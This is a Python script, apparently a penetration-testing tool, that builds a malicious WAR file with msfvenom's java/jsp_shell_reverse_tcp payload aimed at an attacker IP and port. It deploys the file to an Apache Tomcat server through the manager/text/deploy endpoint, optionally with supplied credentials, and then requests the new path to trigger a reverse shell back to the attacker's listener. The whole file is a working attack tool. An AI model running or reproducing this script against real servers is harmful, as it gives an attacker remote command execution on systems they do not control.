import requests, argparse, string, random
from subprocess import DEVNULL, STDOUT, check_call
from termcolor import colored 

def print_message(message, type):
   if type == 'SUCCESS':
        print('[' + colored('SUCCESS', 'green') +  '] ' + message)
   elif type == 'INFO':
        print('[' + colored('INFO', 'blue') +  '] ' + message)
   elif type == 'WARNING':
        print('[' + colored('WARNING', 'yellow') +  '] ' + message)
   elif type == 'ALERT':
        print('[' + colored('ALERT', 'yellow') +  '] ' + message)
   elif type == 'ERROR':
        print('[' + colored('ERROR', 'red') +  '] ' + message)

def get_normalized_url(url):
   if url[-1] != '/':
      url += '/'
   if url[0:7].lower() != 'http://' and url[0:8].lower() != 'https://':
      url = "http://" + url
   return url

def get_proxy_protocol(url):
   if url[0:8].lower() == 'https://':
      return 'https'
   return 'http'

def get_random_string(length):
   chars = string.ascii_letters + string.digits
   return ''.join(random.choice(chars) for i in range(length))

parser = argparse.ArgumentParser(description='Automatically generate malicious WAR file and deploy to Tomcat server')
parser.add_argument('URL', type=str, default="127.0.0.1",
                  help='Base URL of Apache Tomcat (Example: http://127.0.0.1:8080/)')
parser.add_argument('-u', '--username', default=None, type=str,
                  help='The username for authentication (Default: None)')
parser.add_argument('-p', '--password', default=None, type=str,
                  help='The password for authentication (Default: None)')
parser.add_argument('-I', '--atk-ip', type=str,
                  help='IP address for automatic reverse shell (Default: Disabled)')
parser.add_argument('-P', '--atk-port', type=str,
                  help='Port for automatic reverse shell (Default: Disabled)')
parser.add_argument('-f', '--file', type=str,
                  help='Use existing WAR file')
parser.add_argument('-a', '--application', type=str, default=get_random_string(8),
                  help='Deployment name for the reverse shell (Default: random eight characters)')
parser.add_argument('-r', '--proxy', type=str, 
                  help='Proxy for requests (Default: Disabled)')

args = parser.parse_args()

if (not args.atk_ip or not args.atk_port) and not args.file:
	print_message("Either both -I and -P must be set to generate a WAR file, or you must point to your own with -f", "ERROR")
	exit()

base_url = get_normalized_url(args.URL)
deploy_url = "{base}manager/text/deploy?path=/{app}".format(base=base_url,app=args.application)
trigger_url = "{base}{app}/".format(base=base_url,app=args.application)

if args.proxy:
   proxy_url = get_normalized_url(args.proxy)
   proxy_protocol = get_proxy_protocol(proxy_url)
   proxies = { proxy_protocol: proxy_url }
else:
   proxies = {}

try:
	request = requests.get(base_url, proxies=proxies)
except Exception as e:
	print_message("Could not connect to {url}".format(url=base_url), "ERROR")
	print(e)
else:
	print_message("Connected to webserver successfully!", "SUCCESS")

if args.file:
	war_file = args.file
else:
	war_file = "shell.war"
	print_message("Generating the WAR payload. This can take a moment!", "INFO")
	try:
		msfvenom_ip = 'LHOST={ip}'.format(ip=args.atk_ip)
		msfvenom_port = 'LPORT={port}'.format(port=args.atk_port)
		check_call(['msfvenom', '-p', 'java/jsp_shell_reverse_tcp', msfvenom_ip, msfvenom_port, '-f', 'war', '-o', war_file], stdout=DEVNULL, stderr=STDOUT)
	except:
		print_message("Failed to generate WAR file. Are you sure msfvenom is installed?", "ERROR")
		exit()
	else:
		print_message("Generated payload to {file}".format(file=war_file), "SUCCESS")

try:
	with open(war_file, 'rb') as file_object:
		try:
			if args.username and args.password:
				request = requests.put(deploy_url, auth=(args.username, args.password), data=file_object, proxies=proxies)
			else:
				request = requests.put(deploy_url, data=file_object, proxies=proxies)
		except Exception as e:
			print(e)
		else:
			if request.status_code == 200:
				print_message("Deployed the application: {app}".format(app=args.application), "SUCCESS")
			elif request.status_code == 401 and args.username and args.password:
				print_message("Could not deploy the application. The given credentials appear to be incorrect", "ERROR")
				exit()
			elif request.status_code == 401:
				print_message("This instance of Tomcat appears to require authentication", "ERROR")
				exit()
			else:
				print_message("Something went wrong during deployment of the application", "ERROR")
				exit()
except Exception as e:
	print_message("Failed to open the WAR file", "ERROR")
	exit()

try:
	request = requests.get(trigger_url, proxies=proxies)
except Exception as e:
	print(e)
else:
	print_message("Triggered the reverse shell. Check your listener!", "INFO")
